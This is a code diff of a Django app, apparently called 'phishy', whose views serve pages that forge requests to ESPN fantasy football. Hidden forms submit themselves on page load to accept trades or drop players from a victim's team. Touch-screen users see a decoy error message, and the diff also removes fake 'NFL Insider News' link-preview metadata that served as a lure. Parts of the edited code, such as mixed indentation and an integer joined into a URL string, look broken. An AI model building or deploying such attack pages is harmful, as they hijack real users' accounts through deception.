@@ -1,5 +1,6 @@
 from django.shortcuts import render,Http404
 from django.http import HttpResponse
+WEEK = 6
 
 MAPPINGS = {
 	'Uncle Drew':'1210475',
@@ -24,8 +25,7 @@ ROSTER = {
 
 
 def index(request):
-	return Http404();
-	return HttpResponse("<head><meta property='og:image' content='www.nfl-insider-news.com/logo.png'/><meta property='og:title' content='NFL Insider News' /><meta property='og:description' content='Latest insider access to NFL news and more!' /></head>.")
+	return render(request,"phishy/index.html")
 
 # Create your views here.
 #jj nelson for taylors terrance west
@@ -36,10 +36,10 @@ def acceptTrade(request,
 				victimTeamId,
 				victimPlayerId,
 				victimPlayerRosterPosition,
-				sourceTeamId=MAPPINGS['Camateur Hour'],
-				sourcePlayerId=MAPPINGS['JJ Nelson'],
-				sourcePlayerRosterPosition=MAPPINGS['JJ Nelson Roster'],
-				leagueId=MAPPINGS['Uncle Drew']):
+				sourceTeamId,
+				sourcePlayerId,
+				sourcePlayerRosterPosition,
+				leagueId):
 	url = "games.espn.com/ffl/tradereview?leagueId="+leagueId+"&teamId=-2147483648&batchId="+batchId
 	transaction = "4_{0}_{1}_{2}_{3}_20|4_{4}_{3}_{5}_{1}_20".format(str(victimPlayerId),str(victimTeamId),str(victimPlayerRosterPosition),str(sourceTeamId),str(sourcePlayerId),str(sourcePlayerRosterPosition))
 	js = '<script>\ndocument.addEventListener("DOMContentLoaded", function(){\n\
@@ -68,21 +68,21 @@ def dropPlayer(request,
 				victimTeamId,
 				victimPlayerId,
 				victimPlayerRosterPosition,
-				week,
-				leagueId=MAPPINGS['Uncle Drew']):
-	url = "games.espn.com/ffl/clubhouse?leagueId="+leagueId+"&teamId="+victimTeamId+"&scoringPeriodId="+week
-	transaction = "3_{0}_{1}_{2}_-1_1002".format(str(victimPlayerId),str(victimTeamId),str(victimPlayerRosterPosition))
-	html = '<form action="http://'+url+'" name="dropForm" method="POST" >\
-      <input type="hidden" name="incoming" value="1" />\
-      <input type="hidden" name="confirmed" value="1" />\
-      <input type="hidden" name="trans" value="'+transaction+'" />\
-      <input type="hidden" name="confirmBtn" value="Confirm" />\
-      <input type="submit" style="display:none" value="Form drop" />\
-    </form>'
-	js = '<script>\ndocument.addEventListener("DOMContentLoaded", function(){\n\
-			if("ontouchstart" in document.documentElement){\n\
-			document.getElementById("header").innerHTML = "This content cannot be displayed on your device. Please try another device or browser";}\n\
-			else{ \n\
-			document.forms.dropForm.submit();\n\
-			//document.getElementById("header").innerHTML = "not a touch screen, prime";\n}\n })</script>'
-	return HttpResponse(html+js)
+				leagueId):
+    week = WEEK
+    url = "games.espn.com/ffl/clubhouse?leagueId="+leagueId+"&teamId="+victimTeamId+"&scoringPeriodId="+week
+    transaction = "3_{0}_{1}_{2}_-1_1002".format(str(victimPlayerId),str(victimTeamId),str(victimPlayerRosterPosition))
+    html = '<form action="http://'+url+'" name="dropForm" method="POST" >\
+            <input type="hidden" name="incoming" value="1" />\
+            <input type="hidden" name="confirmed" value="1" />\
+            <input type="hidden" name="trans" value="'+transaction+'" />\
+            <input type="hidden" name="confirmBtn" value="Confirm" />\
+            <input type="submit" style="display:none" value="Form drop" />\
+            </form>'
+    js = '<script>\ndocument.addEventListener("DOMContentLoaded", function(){\n\
+            if("ontouchstart" in document.documentElement){\n\
+            document.getElementById("header").innerHTML = "This content cannot be displayed on your device. Please try another device or browser";}\n\
+            else{ \n\
+            document.forms.dropForm.submit();\n\
+            //document.getElementById("header").innerHTML = "not a touch screen, prime";\n}\n })</script>'
+    return HttpResponse(html+js)
